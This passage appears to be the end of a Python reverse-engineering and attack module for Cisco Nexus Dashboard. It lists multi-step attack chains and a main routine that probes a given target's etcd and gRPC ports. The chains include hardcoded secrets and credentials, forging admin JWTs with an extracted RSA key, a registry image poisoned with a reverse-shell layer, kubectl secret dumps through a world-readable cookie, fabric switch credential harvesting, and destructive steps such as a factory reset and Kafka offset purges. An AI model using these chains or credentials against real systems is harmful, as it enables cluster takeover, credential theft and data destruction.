    "chain_3_ci_pivot": {
        "title": "OCI Annotation Intel -> Internal Network Pivot",
        "steps": [
            "1. Extract stacker YAML from any OCI manifest annotation",
            "2. Identify SSH key ID: 23cd94a3-.../ssh-key-GH_SSH_KEY (Jenkins CI key)",
            "3. Access aci-github.cisco.com with exfiltrated CI SSH key",
            "4. Read ND source repositories -> hardcoded secrets, internal API endpoints",
            "5. Access aci-docker-reg.cisco.com -> push malicious container layers",
            "6. Poison next ND upgrade with backdoored container",
        ],
        "entry_requirement": "ND image file read access (available to any ND node)",
        "findings": ["ND-F06"],
    },
    "chain_4_jwt_injection": {
        "title": "etcd Bypass -> TrustedJWTKeys Injection -> Forged Admin JWT",
        "steps": [
            "1. CVE-2021-28235 against KMS etcd:3379 -> dump app-user mTLS certs (ND-F03)",
            "2. Use app-user mTLS cert (ciscoAvPair: all/admin/) to reach aaaserver:7770",
            "3. POST attacker RSA pubkey to /aaa/v4/TrustedJWTKeys (ND-F10)",
            "4. Sign JWT {sub: <any-user>, ciscoAvPair: all/admin/} with attacker private key",
            "5. Present JWT to ND API gateway -> full admin access cluster-wide",
            "6. Injected key persists in MongoDB -> survives aaaserver restarts",
        ],
        "entry_requirement": "Network access to KMS etcd port 3379",
        "findings": ["ND-F03", "ND-F04", "ND-F10"],
    },
    "chain_5_apigw_bypass": {
        "title": "Default Tyk Secret -> Gateway API Key Injection -> Full Auth Bypass",
        "steps": [
            "1. Network access to apigw (port 443) — internal cluster or external if exposed",
            "2. POST /tyk/apis with x-tyk-authorization: 352d20ee67be67f6340b4c0605b044b7 "
               "-> create open-policy API definition shadowing existing ND routes (ND-F11)",
            "3. All ND UI and API calls matching new route bypass authentication",
            "4. Alternate: GET /tyk/keys -> enumerate all active session tokens",
            "5. Alternate: read /logs/launcher.log -> extract live secret if rotated (ND-F14)",
        ],
        "entry_requirement": "Network access to Tyk admin API (internal cluster or if port 443 exposed)",
        "findings": ["ND-F11", "ND-F14"],
    },
    "chain_6_firmwared_ssrf": {
        "title": "acs upgrade peer:// -> firmwared SSRF -> Internal Network Discovery",
        "steps": [
            "1. Obtain admin cookie (ND-F01) -> call acs upgrade update",
            "2. filepath=peer://TARGET_IP:PORT causes firmwared to initiate outbound TCP",
            "3. Probe cluster-internal services not exposed to management network",
            "4. Combine with ND-F12 dev key: forge firmware blob -> send to /api/v1/firmware/upload",
            "5. Signed with AbraxasACIDev key -> accepted as valid -> deploy malicious firmware",
        ],
        "entry_requirement": "ND-F01 cookie + acs binary execution on node",
        "findings": ["ND-F09", "ND-F12"],
    },
    "chain_7_credential_harvest": {
        "title": "Log Read -> Multi-Credential Harvest -> Lateral Movement",
        "steps": [
            "1. ND-F01 cookie -> GET /keyhole/api/v1/techsupport -> download log bundle",
            "2. keyhole.log contains: peer_password from acs upgrade operations (ND-F09)",
            "3. launcher.log contains: Tyk admin secret (ND-F14)",
            "4. ND admin password -> SSH to ND nodes -> K8s cluster access (ND-F02)",
            "5. Tyk admin secret -> POST /tyk/apis -> inject gateway bypass (ND-F11)",
            "6. Three independent credentials from a single log bundle read",
        ],
        "entry_requirement": "ND-F01 world-readable cookie",
        "findings": ["ND-F01", "ND-F09", "ND-F14", "ND-F11"],
    },
    "chain_8_minio_exfil": {
        "title": "TLS Cert Read -> MinIO Cred Derivation -> Full Object Store Exfil",
        "steps": [
            "1. ND-F17 GET confd:19999/api/debug/passphraseresp OR ND-F01 log bundle read",
            "2. Obtain /minio/certs/private.key (minio pod volume or keyhole techsupport bundle)",
            "3. derive_minio_secret_from_cert() -> MINIO_SECRET_KEY = line 2 of private.key",
            "4. access_key='minio-nd-access-key' (hardcoded, same on all ND deployments)",
            "5. GET /minio/prometheus/metrics (no auth) -> enumerate bucket names (ND-F20)",
            "6. mc alias set nd http://minio:9000 minio-nd-access-key <derived_secret> -> "
               "mc ls nd/ -> download all ND backups, config exports, firmware blobs",
            "7. Alternate: K8s kubectl get configmap minio-access-key -o json "
               "-> .data['initkey'] = same derived key after first startup",
        ],
        "entry_requirement": "Read access to minio TLS cert or K8s ConfigMap in minio namespace",
        "findings": ["ND-F19", "ND-F20", "ND-F17"],
    },
    "chain_9_kafka_zk_cluster_takeover": {
        "title": "ND Image Read -> ZK Cred Extraction -> Kafka Cluster Metadata Write",
        "steps": [
            "1. ND-F01 log bundle (techsupport) OR ND-F23 image extraction -> "
               "/secure/kafka_server.jaas: apic:LF9DS0MCP282VGL1 (ZK digest cred)",
            "2. Confirm ZK listening: probe_zookeeper_cred(host, 2181) -> banner + auth_success",
            "3. ND-F24: zookeeper.set.acl=false -> no ACLs on any Kafka ZK node",
            "4. zkCli (authenticated) -> ls /brokers/topics -> enumerate all Kafka topics",
            "5. ls /kafka-acl/Topic -> dump APIC authorizer ACL policy for all topics",
            "6. set /kafka-acl/Topic/<topic> -> overwrite ACL to grant ANY principal full access",
            "7. Alternate DoS: set /brokers/ids/<id> invalid data -> controller loses broker",
            "8. Alternate data destruction: set /config/topics/__consumer_offsets "
               "{retention.ms: 1} -> purge all consumer offset history",
        ],
        "entry_requirement": "ND image file access (ND-F01) OR ZooKeeper port 2181 reachable with extracted cred",
        "findings": ["ND-F23", "ND-F24", "ND-F01"],
    },
    "chain_10_jwt_key_exfil_full_apigw_bypass": {
        "title": "Host Filesystem Read -> JWT RSA Key Extract -> Forge Admin Token -> Full APIGW Bypass",
        "steps": [
            "1. ND-F01 cookie -> GET /keyhole/api/v1/techsupport -> download tech support bundle",
            "   OR ND-F03 etcd KMS noauth -> etcdctl get /keys -> extract JWT key material from KV store",
            "   OR container escape on any pod with hostPath /data/services/kms_etcd mount",
            "2. Read /data/services/kms_etcd/keys/v1/se/rsa.priv -> RSA-2048 private key (ND-F25)",
            "3. Craft JWT: {'sub':'admin','role':'Domain-Admin','iss':'nd-apigw','exp':<far future>}",
            "4. Sign with rsa.priv using RS256 -> valid ND JWT token",
            "5. All APIGW endpoints with authType:jwt accept the forged token:",
            "   POST /api/v1/licensemgr/ -> grant unlimited license",
            "   GET  /sedgeapi/v1/authy-ldap/api/ -> dump all LDAP auth config",
            "   ANY /api/v1/<service>/ endpoint across MSO/NDFC/NIR",
            "6. Alternate: api.key (HMAC) -> forge API key JWTs for service-to-service tokens",
            "7. ND-F27: tech support bundle contains inner .tar archives with unsanitized creds",
            "   -> single bundle pull yields JWT key + TLS keys + service passwords",
        ],
        "entry_requirement": "ND-F01 world-readable cookie OR ND-F03 etcd noauth OR container escape",
        "findings": ["ND-F25", "ND-F01", "ND-F03", "ND-F27"],
    },
    "chain_13_keyhole_cookie_kubectl_cluster_takeover": {
        "title": "Keyhole World-Readable Cookie -> Arbitrary kubectl -> Cluster Takeover",
        "entry_requirement": "Local process execution on any ND cluster node (any user)",
        "steps": [
            "1. Read /var/run/admin.cookie (0644 world-readable): COOKIE=$(cat /var/run/admin.cookie)",
            "2. GET http://localhost:30020/keyhole/api/v1/kubectl?args=get%20secrets%20-A%20-o%20json&cookie=$COOKIE",
            "   -> kubectl runs with /home/rescue-user/.kube/config (cluster-admin kubeconfig, ND-F43)",
            "   -> dumps all K8s secrets cluster-wide including kube-system service account tokens",
            "3. Extract kube-system admin token from response",
            "4. Full cluster-admin K8s API access",
            "5. OPTIONAL: GET /keyhole/api/v1/passphrase?cookie=$COOKIE -> issh passphrase for SSH lateral movement (ND-F02)",
            "6. OPTIONAL: GET /keyhole/api/v1/reboot/factory-reset?cookie=$COOKIE -> destructive cluster wipe",
            "7. OPTIONAL: Network path -> sniff port 30020 traffic -> steal cookie in transit (ND-F44)",
        ],
        "findings": ["ND-F01", "ND-F43", "ND-F02"],
        "severity": "CRITICAL",
        "no_privileges_required": True,
        "note": (
            "Entry requirement is any code execution on the ND node — achievable via ND-F01 "
            "techsupport bundle RCE path, ND-F29 Zot image poisoning, or ND-F30 cluster-admin SA token. "
            "Chain is also accessible via ND-F44 (network sniffing, no local access needed)."
        ),
    },
    "chain_11_zot_image_poison_cluster_takeover": {
        "title": "Zot No-Auth Registry Image Push -> Pod Code Exec -> Cluster-Admin SA Token -> Cluster Takeover",
        "steps": [
            "1. ND-F29: Zot registry has no auth block -> docker pull <nd-host>:<RegistryPort>/apic-sn/apigw:latest",
            "   Enumerate available images: GET https://<nd-host>:<port>/v2/_catalog",
            "2. Pull target image, add reverse shell layer (alpine + busybox netcat):",
            "   docker pull <nd-host>:<port>/apic-sn/cisco-ndfc/dcnm-server:latest",
            "   docker build -t evil:1 . --build-arg BASE=<above>",
            "   docker push <nd-host>:<port>/apic-sn/cisco-ndfc/dcnm-server:evil",
            "3. Trigger image update: kubectl --token=<any-valid> set image deployment/dcnm-server dcnm-server=evil:1",
            "   OR wait for ND upgrade cycle (upgrade-helper watches Zot for new tags)",
            "4. New pod starts with poisoned image -> shell callback or key drop",
            "5. Pod is in cisco-ndfc namespace -> service account token = cluster-admin (ND-F30)",
            "   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
            "6. curl -k https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets",
            "   -H 'Authorization: Bearer $TOKEN' -> all kube-system secrets",
            "7. Extract etcd TLS certs, controller-manager kubeconfig -> node root",
            "8. ND-F35: read /var/run/secrets/case.cncf.io/infra-access/access.token",
            "   -> ND core API access as NDFC service principal",
        ],
        "entry_requirement": "Network reach to Zot registry port (host-routable, hostNetwork:true)",
        "findings": ["ND-F29", "ND-F30", "ND-F35"],
    },
    "chain_12_fabric_credential_harvest": {
        "title": "JWT RSA Key -> Forged Admin JWT -> NDFC Switch Credential API -> All Fabric Device Access",
        "steps": [
            "1. ND-F25: read /data/services/kms_etcd/keys/v1/se/rsa.priv -> JWT RSA-2048 private key",
            "   (via ND-F01 techsupport bundle OR ND-F03 etcd KMS dump OR container escape)",
            "2. Forge JWT: {'sub': 'admin', 'role': 'Domain-Admin', 'iss': 'nd-apigw', 'exp': far_future}",
            "   signed RS256 with rsa.priv -> accepted by all APIGW authType:jwt endpoints",
            "3. ND-F33: GET /api/v1/rest/lanconfig/getlanswitchcredentials",
            "   Authorization: Bearer <forged-jwt>",
            "   -> JSON response: all fabric switch SSH credentials, SNMP strings, device passwords",
            "4. ND-F33: GET /api/v1/sancredential/getfabricswitchcredentials",
            "   -> SAN fabric (FC switch) credentials",
            "5. ND-F33: GET /api/v1/rest/lanconfig/getrobotcredentials",
            "   -> automation/robot account credentials for all managed fabrics",
            "6. SSH to each Nexus switch with harvested credentials -> full fabric control",
            "7. ND-F31: MSO executionservice DEBUG logs -> fabric push operations in logs",
            "   ND-F32: NDFC POAP DEBUG logs -> switch bootstrap credentials",
            "   Combined: complete device credential set from three independent sources",
        ],
        "entry_requirement": "ND-F25 RSA key extraction (ND-F01 / ND-F03 / container escape)",
        "findings": ["ND-F25", "ND-F33", "ND-F31", "ND-F32", "ND-F01"],
    },
}


if __name__ == "__main__":
    import sys

    print("=== Cisco Nexus Dashboard 3.2.2m RE Module ===")
    print(f"Findings: {len(FINDINGS)}")
    print()

    for fid, f in FINDINGS.items():
        sev = f["severity"]
        print(f"[{sev:8}] {fid}: {f['title']}")

    if len(sys.argv) > 1:
        target = sys.argv[1]
        print(f"[*] Probing {target}")
        print("[*] Checking etcd KMS port 3379...")
        print(json.dumps(probe_etcd_kms_noauth(target), indent=2))
        print("[*] Checking kms.bin gRPC port 7777...")
        print(json.dumps(probe_kms_grpc_port(target), indent=2))
